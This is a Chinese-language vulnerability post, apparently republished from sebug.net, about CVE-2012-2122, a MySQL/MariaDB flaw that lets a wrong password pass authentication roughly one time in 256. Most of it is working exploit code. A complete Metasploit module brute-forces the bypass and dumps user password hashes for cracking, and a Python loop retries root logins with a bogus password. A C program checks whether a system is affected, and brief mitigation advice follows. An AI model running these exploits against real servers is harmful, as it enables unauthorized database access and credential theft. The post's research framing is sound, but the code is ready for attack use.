title: "MySQL 概率性任意密码(身份认证)登录漏洞(CVE-2012-2122)"
id: 47
date: 2012-07-01 12:16:30
tags: 
- Metasploit
- Mysql
- 任意密码登录
categories: 
- 技术文章
- 最新漏洞
---

###发布时间: 2012-06-11 (GMT+0800)
##漏洞版本:

MySQL &lt; 5.6.6
MySQL &lt; 5.5.24
MySQL &lt; 5.1.63
MariaDB &lt; 5.5.23
MariaDB &lt; 5.3.6
MariaDB &lt; 5.2.12
MariaDB &lt; 5.1.62

##漏洞描述:

CVE ID: CVE-2012-2122

MariaDB是为MySQL提供偶然替代功能的数据库服务器。MySQL是开源数据库。

MariaDB 5.1.62, 5.2.12、5.3.6、5.5.23之前版本和MySQL 5.1.63、5.5.24、5.6.6之前版本在用户验证的处理上存在安全漏洞，可能导致攻击者无需知道正确口令就能登录到MySQL服务器。

用户连接到MariaDB/MySQL后，应用会计算和比较令牌值，由于错误的转换，即使memcmp()返回非零值，也可能出现错误的比较，造成MySQL/MariaDB误认为密码是正确的，因为协议使用的是随机字符串，该Bug发生的几率为1/256。MySQL的版本是否受影响取决于程序的编译方式，很多版本（包括官方提供的二进制文件）并不受此漏洞的影响。

也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。而且漏洞利用工具已经出现。

>参考
http://seclists.org/oss-sec/2012/q2/493

测试方法:

本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!
<!--more-->

```ruby
#####  方法一、

&amp;nbsp;
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
##

require 'msf/core'

class Metasploit3 &lt; Msf::Auxiliary

include Msf::Exploit::Remote::MYSQL
include Msf::Auxiliary::Report

include Msf::Auxiliary::Scanner

def initialize
super(
'Name' =&gt; 'MYSQL CVE-2012-2122 Authentication Bypass Password Dump',
'Version' =&gt; '$Revision$',
'Description' =&gt; %Q{
This module exploits a password bypass vulnerability in MySQL in order
to extract the usernames and encrypted password hashes from a MySQL server.
These hashes ares stored as loot for later cracking.
},
'Authors' =&gt; [
'TheLightCosine &lt;thelightcosine[at]metasploit.com&gt;', # Original hashdump module
'jcran' # Authentication bypass bruteforce implementation
],
'References' =&gt; [
['CVE', '2012-2122']
],
'DisclosureDate' =&gt; 'Jun 09 2012',
'License' =&gt; MSF_LICENSE
)

deregister_options('PASSWORD')
end

def run_host(ip)

# Keep track of results (successful connections)
results = []

# Username and password placeholders
username = datastore['USERNAME']
password = Rex::Text.rand_text_alpha(rand(8)+1)

# Do an initial check to see if we can log into the server at all
begin
socket = connect(false)
x = ::RbMysql.connect({
:host =&gt; rhost,
:port =&gt; rport,
:user =&gt; username,
:password =&gt; password,
:read_timeout =&gt; 300,
:write_timeout =&gt; 300,
:socket =&gt; socket
})
x.connect
results &lt;&lt; x

print_good &quot;#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password&quot;

rescue RbMysql::HostNotPrivileged
print_error &quot;#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)&quot;
return
rescue RbMysql::AccessDeniedError
print_good &quot;#{rhost}:#{rport} The server allows logins, proceeding with bypass test&quot;
rescue ::Interrupt
raise $!
rescue ::Exception =&gt; e
print_error &quot;#{rhost}:#{rport} Error: #{e}&quot;
return
end

# Short circuit if we already won
if results.length &gt; 0
@mysql_handle = results.first
return dump_hashes
end

#
# Threaded login checker
#
max_threads = 16
cur_threads = []

# Try up to 1000 times just to be sure
queue = [*(1 .. 1000)]

while(queue.length &gt; 0)
while(cur_threads.length &lt; max_threads)

# We can stop if we get a valid login
break if results.length &gt; 0

# keep track of how many attempts we've made
item = queue.shift

# We can stop if we reach 1000 tries
break if not item

# Status indicator
print_status &quot;#{rhost}:#{rport} Authentication bypass is #{item/10}% complete&quot; if (item % 100) == 0

t = Thread.new(item) do |count|
begin
# Create our socket and make the connection
s = connect(false)
x = ::RbMysql.connect({
:host =&gt; rhost,
:port =&gt; rport,
:user =&gt; username,
:password =&gt; password,
:read_timeout =&gt; 300,
:write_timeout =&gt; 300,
:socket =&gt; s,
:db =&gt; nil
})
print_status &quot;#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts&quot;
results &lt;&lt; x
rescue RbMysql::AccessDeniedError
rescue Exception =&gt; e
print_status &quot;#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}&quot;
end
end

cur_threads &lt;&lt; t

end

# We can stop if we get a valid login
break if results.length &gt; 0

# Add to a list of dead threads if we're finished
cur_threads.each_index do |ti|
t = cur_threads[ti]
if not t.alive?
cur_threads[ti] = nil
end
end

# Remove any dead threads from the set
cur_threads.delete(nil)

::IO.select(nil, nil, nil, 0.25)
end

# Clean up any remaining threads
cur_threads.each {|x| x.kill }

if results.length &gt; 0
print_good(&quot;#{rhost}:#{rport} Successful exploited the authentication bypass flaw, dumping hashes...&quot;)
@mysql_handle = results.first
return dump_hashes
end

print_error(&quot;#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable&quot;)
end

def dump_hashes

# Grabs the username and password hashes and stores them as loot
res = mysql_query(&quot;SELECT user,password from mysql.user&quot;)
if res.nil?
print_error(&quot;#{rhost}:#{rport} There was an error reading the MySQL User Table&quot;)
return

end

# Create a table to store data
tbl = Rex::Ui::Text::Table.new(
'Header' =&gt; 'MysQL Server Hashes',
'Indent' =&gt; 1,
'Columns' =&gt; ['Username', 'Hash']
)

if res.size &gt; 0
res.each do |row|
next unless (row[0].to_s + row[1].to_s).length &gt; 0
tbl &lt;&lt; [row[0], row[1]]
print_good(&quot;#{rhost}:#{rport} Saving HashString as Loot: #{row[0]}:#{row[1]}&quot;)
end
end

this_service = nil
if framework.db and framework.db.active
this_service = report_service(
:host =&gt; rhost,
:port =&gt; rport,
:name =&gt; 'mysql',
:proto =&gt; 'tcp'
)
end

report_hashes(tbl.to_csv, this_service) unless tbl.rows.empty?

end

# Stores the Hash Table as Loot for Later Cracking
def report_hashes(hash_loot,service)
filename= &quot;#{rhost}-#{rport}_mysqlhashes.txt&quot;
path = store_loot(&quot;mysql.hashes&quot;, &quot;text/plain&quot;, rhost, hash_loot, filename, &quot;MySQL Hashes&quot;, service)
print_status(&quot;#{rhost}:#{rport} Hash Table has been saved: #{path}&quot;)

end

end
```

```python

########################################################################################
测试方法,2

#!/usr/bin/python
import subprocess

while 1:
 subprocess.Popen(&quot;mysql -u root mysql --password=blah&quot;, shell=True).wait()

########################################################################################
```

```cpp
测试方法,3

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(void) {
 int one, two, ret;
 time_t start = time(0);
 time_t now;

 srand(getpid()*start);
 while (1) {
 one = rand();
 two = rand();
 ret = memcmp(&amp;one, &amp;two, sizeof(int));
 if (ret &lt; -128 || ret &gt; 127)
 break;
 time(&amp;now);
 if (now - start &gt; 10) {
 printf(&quot;Not triggered in 10 seconds, *probably* not vulnerable..n&quot;);
 return 1;
 }
 }
 printf(&quot;Vulnerable! memcmp returned: %dn&quot;, ret);
 return 0;
}
```

安全建议:

临时解决办法：

在防火墙上关闭mysql端口
厂商补丁：

MySQL AB
--------
目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：

http://www.mysql.com/

MariaDB
-------
目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：

http://mariadb.org/

本文转自：sebug.net
